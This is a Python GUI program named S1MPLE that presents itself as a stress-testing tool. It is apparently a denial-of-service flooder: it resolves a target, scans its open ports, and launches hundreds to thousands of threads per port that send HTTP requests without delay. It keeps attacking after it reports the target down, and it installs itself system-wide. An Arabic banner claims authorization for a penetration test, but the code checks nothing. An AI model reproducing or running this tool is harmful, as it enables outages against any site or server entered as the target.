#!/usr/bin/env python3
"""
S1MPLE - Multi-Port Stress Testing Tool
لدي إذن ومخوّل لإجراء اختبار الاختراق هذا
"""

import tkinter as tk
from tkinter import ttk, scrolledtext
import sys
import os
import socket
import threading
import random
import time
import shutil
import re

# ========== TOP 1000 COMMON PORTS ==========
TOP_PORTS = [
    21,22,23,25,53,69,80,81,110,111,123,135,137,138,139,143,161,162,179,389,
    443,445,465,500,514,515,520,523,541,546,547,548,554,587,636,646,843,989,
    990,993,994,995,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,
    1036,1037,1038,1039,1040,1080,1081,1099,1100,1101,1102,1103,1104,1105,
    1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,
    1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,
    1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,
    1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,
    1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,
    1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,
    1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,
    1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,
    1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,
    1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,
    1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,
    1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,
    1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,
    1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,
    1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,
    1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,
    1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,
    1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,
    1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,
    1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,
    1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,
    1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,
    1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,
    1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,
    1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,
    1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,
    1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,
    1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,
    1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,
    1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,
    1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,
    1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,
    1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,
    1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,
    1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,
    1596,1597,1598,1599,1600,1601,1602,1603,1604,1605,1606,1607,1608,1609,
    1610,1611,1612,1613,1614,1615,1616,1617,1618,1619,1620,1621,1622,1623,
    1624,1625,1626,1627,1628,1629,1630,1631,1632,1633,1634,1635,1636,1637,
    1638,1639,1640,1641,1642,1643,1644,1645,1646,1647,1648,1649,1650,1651,
    1652,1653,1654,1655,1656,1657,1658,1659,1660,1661,1662,1663,1664,1665,
    1666,1667,1668,1669,1670,1671,1672,1673,1674,1675,1676,1677,1678,1679,
    1680,1681,1682,1683,1684,1685,1686,1687,1688,1689,1690,1691,1692,1693,
    1694,1695,1696,1697,1698,1699,1700,1701,1702,1703,1704,1705,1706,1707,
    1708,1709,1710,1711,1712,1713,1714,1715,1716,1717,1718,1719,1720,1721,
    1722,1723,1724,1725,1726,1727,1728,1729,1730,1731,1732,1733,1734,1735,
    1736,1737,1738,1739,1740,1741,1742,1743,1744,1745,1746,1747,1748,1749,
    1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,
    1764,1765,1766,1767,1768,1769,1770,1771,1772,1773,1774,1775,1776,1777,
    1778,1779,1780,1781,1782,1783,1784,1785,1786,1787,1788,1789,1790,1791,
    1792,1793,1794,1795,1796,1797,1798,1799,1800,3306,3389,5432,5900,5901,
    5902,5903,6000,6001,6002,6003,6379,6443,7000,7001,7002,7070,7071,8000,
    8001,8002,8003,8004,8005,8006,8007,8008,8009,8010,8011,8012,8013,8014,
    8015,8016,8017,8018,8019,8020,8021,8022,8023,8024,8025,8026,8027,8028,
    8029,8030,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,
    8092,8093,8094,8095,8096,8097,8098,8099,8100,8200,8201,8222,8280,8281,
    8332,8333,8400,8401,8443,8500,8501,8530,8531,8600,8601,8649,8651,8652,
    8654,8686,8787,8800,8801,8811,8834,8880,8881,8882,8883,8888,8889,8890,
    8891,8892,8899,9000,9001,9002,9003,9004,9005,9006,9007,9008,9009,9010,
    9011,9012,9013,9014,9015,9016,9017,9018,9019,9020,9021,9022,9023,9024,
    9025,9026,9027,9028,9029,9030,9040,9041,9050,9051,9060,9061,9080,9081,
    9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9101,9102,9103,
    9104,9105,9106,9107,9108,9109,9110,9111,9200,9201,9202,9203,9204,9205,
    9206,9207,9208,9209,9210,9220,9229,9290,9291,9292,9293,9294,9295,9296,
    9297,9298,9299,9300,9301,9302,9303,9304,9305,9306,9307,9308,9309,9310,
    9311,9312,9313,9314,9315,9316,9317,9318,9319,9320,9321,9322,9323,9324,
    9325,9326,9327,9328,9329,9330,9331,9332,9333,9334,9335,9336,9337,9338,
    9339,9340,9341,9342,9343,9344,9345,9346,9347,9348,9349,9350,9351,9352,
    9353,9354,9355,9356,9357,9358,9359,9360,9361,9362,9363,9364,9365,9366,
    9367,9368,9369,9370,9371,9372,9373,9374,9375,9376,9377,9378,9379,9380,
    9381,9382,9383,9384,9385,9386,9387,9388,9389,9390,9391,9392,9393,9394,
    9395,9396,9397,9398,9399,9400,9418,9443,9444,9595,9600,9666,9800,9876,
    9877,9878,9898,9900,9917,9929,9943,9944,9968,9981,9988,9990,9991,9992,
    9993,9994,9995,9996,9997,9998,9999,10000,10001,10002,10003,10004,10005,
    10006,10007,10008,10009,10010,10050,10051,10101,10102,10103,10104,10105,
    10106,10107,10108,10109,10110,10111,10112,10113,10114,10115,10116,10117,
    10118,10119,10120,10121,10122,10123,10124,10125,10126,10127,10128,10129,
    10130,10131,10132,10133,10134,10135,10136,10137,10138,10139,10140,10141,
    10142,10143,10144,10145,10146,10147,10148,10149,10150,10151,10152,10153,
    10154,10155,10156,10157,10158,10159,10160,10161,10162,10163,10164,10165,
    10166,10167,10168,10169,10170,10171,10172,10173,10174,10175,10176,10177,
    10178,10179,10180,10181,10182,10183,10184,10185,10186,10187,10188,10189,
    10190,10191,10192,10193,10194,10195,10196,10197,10198,10199,10200,10201,
    10202,10203,10204,10205,10206,10207,10208,10209,10210,10211,10212,10213,
    10214,10215,10216,10217,10218,10219,10220,10221,10222,10223,10224,10225,
    10226,10227,10228,10229,10230,10231,10232,10233,10234,10235,10236,10237,
    10238,10239,10240,10241,10242,10243,10244,10245,10246,10247,10248,10249,
    10250,10251,10252,10253,10254,10255,10256,10257,10258,10259,10260,10261,
    10262,10263,10264,10265,10266,10267,10268,10269,10270,10271,10272,10273,
    10274,10275,10276,10277,10278,10279,10280,10281,10282,10283,10284,10285,
    10286,10287,10288,10289,10290,10291,10292,10293,10294,10295,10296,10297,
    10298,10299,10300,10301,10302,10303,10304,10305,10306,10307,10308,10309,
    10310,10311,10312,10313,10314,10315,10316,10317,10318,10319,10320,10321,
    10322,10323,10324,10325,10326,10327,10328,10329,10330,10331,10332,10333,
    10334,10335,10336,10337,10338,10339,10340,10341,10342,10343,10344,10345,
    10346,10347,10348,10349,10350,10351,10352,10353,10354,10355,10356,10357,
    10358,10359,10360,10361,10362,10363,10364,10365,10366,10367,10368,10369,
    10370,10371,10372,10373,10374,10375,10376,10377,10378,10379,10380,10381,
    10382,10383,10384,10385,10386,10387,10388,10389,10390,10391,10392,10393,
    10394,10395,10396,10397,10398,10399,10400,10401,10402,10403,10404,10405,
    10406,10407,10408,10409,10410,10411,10412,10413,10414,10415,10416,10417,
    10418,10419,10420,10421,10422,10423,10424,10425,10426,10427,10428,10429,
    10430,10431,10432,10433,10434,10435,10436,10437,10438,10439,10440,10441,
    10442,10443,10444,10445,10446,10447,10448,10449,10450,10451,10452,10453,
    10454,10455,10456,10457,10458,10459,10460,10461,10462,10463,10464,10465,
    10466,10467,10468,10469,10470,10471,10472,10473,10474,10475,10476,10477,
    10478,10479,10480,10481,10482,10483,10484,10485,10486,10487,10488,10489,
    10490,10491,10492,10493,10494,10495,10496,10497,10498,10499,10500
]

UAGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
]

HEADERS = (
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    "Accept-Language: en-US,en;q=0.9\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Connection: keep-alive\r\n"
    "Cache-Control: no-cache\r\n"
    "Pragma: no-cache\r\n"
)

attack_active = False
site_down_reported = False
stats = {"sent": 0, "failed": 0, "active_threads": 0, "consecutive_fails": 0}
stats_lock = threading.Lock()

INSTALL_PATH = "/usr/local/bin/S1MPLE"

def is_installed():
    return os.path.exists(INSTALL_PATH) and os.access(INSTALL_PATH, os.X_OK)

def install_self():
    if is_installed():
        return True
    try:
        src = os.path.abspath(__file__)
        if not os.access(src, os.X_OK):
            os.chmod(src, 0o755)
        shutil.copy2(src, INSTALL_PATH)
        os.chmod(INSTALL_PATH, 0o755)
        return True
    except Exception:
        return False

def resolve_target(target):
    target = target.strip().replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    try:
        ip = socket.gethostbyname(target)
        return ip
    except Exception:
        return None

def scan_port(host, port, timeout=1.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except Exception:
        return False

class HammerThread(threading.Thread):
    def __init__(self, host, port, log_callback, down_callback):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.log_cb = log_callback
        self.down_cb = down_callback
        ua = random.choice(UAGENTS)
        self.packet = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"User-Agent: {ua}\r\n"
            f"{HEADERS}\r\n"
        ).encode("utf-8")

    def run(self):
        global attack_active, stats, site_down_reported
        host_port = (self.host, self.port)
        packet = self.packet
        pool = []
        for _ in range(3):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect(host_port)
                pool.append(s)
            except Exception:
                pass
        with stats_lock:
            stats["active_threads"] += 1
        while attack_active:
            try:
                if pool:
                    s = pool.pop(0)
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                s.connect(host_port)
                s.sendall(packet)
                try:
                    s.recv(1024)
                except Exception:
                    pass
                s.close()
                with stats_lock:
                    stats["sent"] += 1
                    stats["consecutive_fails"] = 0
                # green done badge style
                self.log_cb(f"[{self.port}] \033[92mdone\033[0m")
                try:
                    ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ns.settimeout(0.5)
                    ns.connect(host_port)
                    pool.append(ns)
                except Exception:
                    pass
            except Exception:
                with stats_lock:
                    stats["failed"] += 1
                    stats["consecutive_fails"] += 1
                    # if too many consecutive fails across threads, site might be down
                    if stats["consecutive_fails"] > 50 and not site_down_reported:
                        site_down_reported = True
                        self.down_cb()
        with stats_lock:
            stats["active_threads"] -= 1

def run_attack(host, ports, threads_per_port, log_callback, down_callback, done_callback):
    global attack_active, stats, site_down_reported
    attack_active = True
    site_down_reported = False
    stats = {"sent": 0, "failed": 0, "active_threads": 0, "consecutive_fails": 0}

    def ansi_log(msg):
        # strip ansi for tkinter display
        clean = re.sub(r'\033\[\d+m', '', msg)
        log_callback(clean)

    def ansi_down():
        down_callback()

    for port in ports:
        for _ in range(threads_per_port):
            t = HammerThread(host, port, ansi_log, ansi_down)
            t.start()

    log_callback(f"[START] Targeting {host} on {len(ports)} port(s)")
    log_callback(f"[POWR] {len(ports) * threads_per_port} total threads")
    log_callback(f"[MODE] MAX SPEED - ZERO DELAY")

    reporter_running = [True]
    def reporter():
        last = 0
        while attack_active and reporter_running[0]:
            time.sleep(1)
            with stats_lock:
                cur = stats["sent"]
                rate = cur - last
                last = cur
                log_callback(f"[STATS] sent={cur:,} fail={stats['failed']:,} rate={rate:,} pkts/s threads={stats['active_threads']}")
    tr = threading.Thread(target=reporter, daemon=True)
    tr.start()

    while attack_active:
        time.sleep(0.1)

    reporter_running[0] = False
    with stats_lock:
        log_callback(f"[DONE] Final: sent={stats['sent']:,} fail={stats['failed']:,}")
    done_callback()

def stop_attack():
    global attack_active
    attack_active = False

# ========== GUI ==========
AUTH_ARABIC = "لدي إذن ومخوّل لإجراء اختبار الاختراق هذا"

class S1MPLE_GUI:
    def __init__(self, root):
        self.root = root
        root.title("S1MPLE")
        root.geometry("850x680")
        root.configure(bg="#0d0d1a")

        self.selected_ports = None
        self.attack_thread = None
        self.site_down_flag = False

        main = tk.Frame(root, bg="#0d0d1a")
        main.pack(fill=tk.BOTH, expand=True, padx=20, pady=(15, 20))

        title = tk.Label(main, text="S1MPLE", font=("Courier", 44, "bold"),
                         fg="#ff1744", bg="#0d0d1a")
        title.pack(pady=(0, 2))

        auth_label = tk.Label(main, text=AUTH_ARABIC, font=("Courier", 9),
                              fg="#ffb300", bg="#0d0d1a")
        auth_label.pack(pady=(0, 5))

        sub = tk.Label(main, text="multi-port stress test", font=("Courier", 10),
                       fg="#888", bg="#0d0d1a")
        sub.pack(pady=(0, 15))

        tk.Label(main, text="TARGET (IP or domain):", font=("Courier", 11, "bold"),
                 fg="#ccc", bg="#0d0d1a", anchor="w").pack(fill=tk.X)
        self.target_entry = tk.Entry(main, font=("Courier", 12), bg="#1a1a2e", fg="white",
                                     insertbackground="white", relief=tk.FLAT, bd=2)
        self.target_entry.pack(fill=tk.X, pady=(4, 10), ipady=4)

        qf = tk.Frame(main, bg="#0d0d1a")
        qf.pack(fill=tk.X, pady=5)
        tk.Label(qf, text="QUICK SELECT:", font=("Courier", 9, "bold"),
                 fg="#aaa", bg="#0d0d1a").pack(side=tk.LEFT, padx=(0, 10))

        def sel_web():
            self.selected_ports = [80, 443]
            self.ports_entry.delete(0, tk.END)
            self.ports_entry.insert(0, "80,443")
            self.status_cfg("[OK] WEB ports (80,443)")

        def sel_common():
            self.selected_ports = [21,22,80,443,8080,8443]
            self.ports_entry.delete(0, tk.END)
            self.ports_entry.insert(0, "21,22,80,443,8080,8443")
            self.status_cfg("[OK] COMMON ports")

        def sel_top():
            self.selected_ports = TOP_PORTS
            self.ports_entry.delete(0, tk.END)
            self.status_cfg("[OK] TOP 1000 ports")

        for txt, cmd in [("WEB", sel_web), ("COMMON", sel_common), ("TOP 1000", sel_top)]:
            b = tk.Button(qf, text=txt, bg="#e94560", fg="white", font=("Courier", 9, "bold"),
                          relief=tk.FLAT, padx=12, pady=3, cursor="hand2", command=cmd)
            b.pack(side=tk.LEFT, padx=3)

        tk.Label(main, text="CUSTOM PORTS (comma/range, e.g. 80,443,8000-8100):",
                 font=("Courier", 9), fg="#888", bg="#0d0d1a", anchor="w").pack(fill=tk.X, pady=(10, 2))
        self.ports_entry = tk.Entry(main, font=("Courier", 11), bg="#1a1a2e", fg="white",
                                    insertbackground="white", relief=tk.FLAT, bd=2)
        self.ports_entry.pack(fill=tk.X, pady=(2, 8), ipady=3)

        tf = tk.Frame(main, bg="#0d0d1a")
        tf.pack(fill=tk.X, pady=5)
        tk.Label(tf, text="THREADS PER PORT:", font=("Courier", 11, "bold"),
                 fg="#ccc", bg="#0d0d1a").pack(side=tk.LEFT)
        self.threads_var = tk.StringVar(value="500")
        sp = tk.Spinbox(tf, from_=50, to=5000, increment=50, textvariable=self.threads_var,
                        font=("Courier", 10), bg="#1a1a2e", fg="white",
                        buttonbackground="#333", relief=tk.FLAT, bd=2, width=8)
        sp.pack(side=tk.LEFT, padx=10)

        bf = tk.Frame(main, bg="#0d0d1a")
        bf.pack(fill=tk.X, pady=8)

        self.start_btn = tk.Button(bf, text="[ START ATTACK ]", bg="#ff1744", fg="white",
                                   font=("Courier", 13, "bold"), relief=tk.FLAT,
                                   padx=20, pady=8, cursor="hand2", command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))

        self.stop_btn = tk.Button(bf, text="[ STOP ]", bg="#555", fg="white",
                                  font=("Courier", 13, "bold"), relief=tk.FLAT,
                                  padx=20, pady=8, cursor="hand2", state=tk.DISABLED,
                                  command=self.stop_attack)
        self.stop_btn.pack(side=tk.LEFT)

        self.status = tk.Label(main, text="READY", font=("Courier", 10),
                               fg="#00e676", bg="#0d0d1a", anchor="w")
        self.status.pack(fill=tk.X, pady=(5, 5))

        self.log_area = scrolledtext.ScrolledText(main, font=("Courier", 9),
                                                  bg="#0a0a14", fg="#00e676",
                                                  insertbackground="white",
                                                  relief=tk.FLAT, bd=0, height=14)
        self.log_area.pack(fill=tk.BOTH, expand=True)

        # tag configs for colors
        self.log_area.tag_config("green", foreground="#00e676")
        self.log_area.tag_config("red", foreground="#ff1744")
        self.log_area.tag_config("yellow", foreground="#ffea00")
        self.log_area.tag_config("cyan", foreground="#00bcd4")
        self.log_area.tag_config("orange", foreground="#ff9100")
        self.log_area.tag_config("down", foreground="#ff1744", font=("Courier", 10, "bold"))

        self.log("[READY] S1MPLE loaded - " + AUTH_ARABIC, "cyan")
        self.log("[READY] Enter target and select ports.", "cyan")

    def log(self, msg, tag=None):
        if tag:
            self.log_area.insert(tk.END, msg + "\n", tag)
        else:
            # auto-detect [PORT] done pattern
            if "done" in msg.lower() and "[" in msg:
                self.log_area.insert(tk.END, msg + "\n", "green")
            elif "TARGET DOWN" in msg or "DOWN" in msg:
                self.log_area.insert(tk.END, msg + "\n", "down")
            elif "ERR" in msg or "error" in msg.lower() or "fail" in msg.lower():
                self.log_area.insert(tk.END, msg + "\n", "red")
            elif "STATS" in msg:
                self.log_area.insert(tk.END, msg + "\n", "yellow")
            elif "SCAN" in msg:
                self.log_area.insert(tk.END, msg + "\n", "cyan")
            elif "START" in msg or "FIRE" in msg or "POWR" in msg:
                self.log_area.insert(tk.END, msg + "\n", "orange")
            else:
                self.log_area.insert(tk.END, msg + "\n")
        self.log_area.see(tk.END)
        self.root.update_idletasks()

    def status_cfg(self, msg):
        self.status.config(text=msg, fg="#00e676")

    def parse_ports(self, text):
        text = text.strip()
        if not text:
            return None
        ports = []
        for part in text.split(","):
            part = part.strip()
            if "-" in part:
                try:
                    a, b = part.split("-")
                    ports.extend(range(int(a), int(b) + 1))
                except Exception:
                    pass
            else:
                try:
                    ports.append(int(part))
                except Exception:
                    pass
        return sorted(set(ports))

    def start_attack(self):
        target = self.target_entry.get().strip()
        if not target:
            self.status.config(text="[ERR] Enter target IP or domain", fg="#ff1744")
            return

        ip = resolve_target(target)
        if not ip:
            self.status.config(text=f"[ERR] Cannot resolve {target}", fg="#ff1744")
            return

        ports = None
        custom = self.ports_entry.get().strip()
        if custom:
            ports = self.parse_ports(custom)
        elif self.selected_ports:
            ports = self.selected_ports
        else:
            ports = TOP_PORTS
            self.log("[INFO] Using TOP 1000 ports (default)", "cyan")

        if not ports:
            self.status.config(text="[ERR] No valid ports", fg="#ff1744")
            return

        try:
            tpp = int(self.threads_var.get())
        except Exception:
            tpp = 500

        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.site_down_flag = False
        self.status.config(text=f"[SCAN] Scanning {len(ports)} ports on {ip}...", fg="#ffea00")
        self.root.update()

        def worker():
            open_ports = []
            for i, port in enumerate(ports):
                if not attack_active:
                    break
                if scan_port(ip, port):
                    open_ports.append(port)
                if (i + 1) % 50 == 0:
                    self.log(f"[SCAN] {i+1}/{len(ports)} checked, {len(open_ports)} open", "cyan")
            if not open_ports:
                self.log("[SCAN] No open ports found!", "red")
                self.root.after(0, lambda: self.status.config(text="[ERR] No open ports", fg="#ff1744"))
                self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
                self.root.after(0, lambda: self.stop_btn.config(state=tk.DISABLED))
                return
            self.log(f"[SCAN] {len(open_ports)} open ports: {open_ports}", "cyan")
            self.root.after(0, lambda: self.status.config(text=f"[FIRE] Attacking {len(open_ports)} ports on {ip}", fg="#ff1744"))

            def log_msg(m):
                self.root.after(0, lambda: self.log(m))

            def down_alert():
                if not self.site_down_flag:
                    self.site_down_flag = True
                    self.root.after(0, lambda: self.log(
                        "[!!!] TARGET DOWN - Site is no longer responding! Attack continuing...", "down"))
                    self.root.after(0, lambda: self.status.config(
                        text="[!!!] TARGET IS DOWN - Still hammering...", fg="#ff1744"))

            def done_cb():
                self.root.after(0, self.attack_done)

            run_attack(ip, open_ports, tpp, log_msg, down_alert, done_cb)

        self.attack_thread = threading.Thread(target=worker, daemon=True)
        self.attack_thread.start()

    def stop_attack(self):
        stop_attack()
        self.log("[STOP] Stopping attack...", "yellow")
        self.status.config(text="[STOP] Stopping...", fg="#ffea00")

    def attack_done(self):
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status.config(text="[DONE] Attack finished", fg="#00e676")

def main():
    if not is_installed():
        if install_self():
            print("[OK] S1MPLE installed globally. Type 'S1MPLE' anywhere to launch.")
            print("[OK] Starting GUI...\n")
        else:
            print("[WARN] Run with sudo for auto-install: sudo python3 ddos.py")
    root = tk.Tk()
    app = S1MPLE_GUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
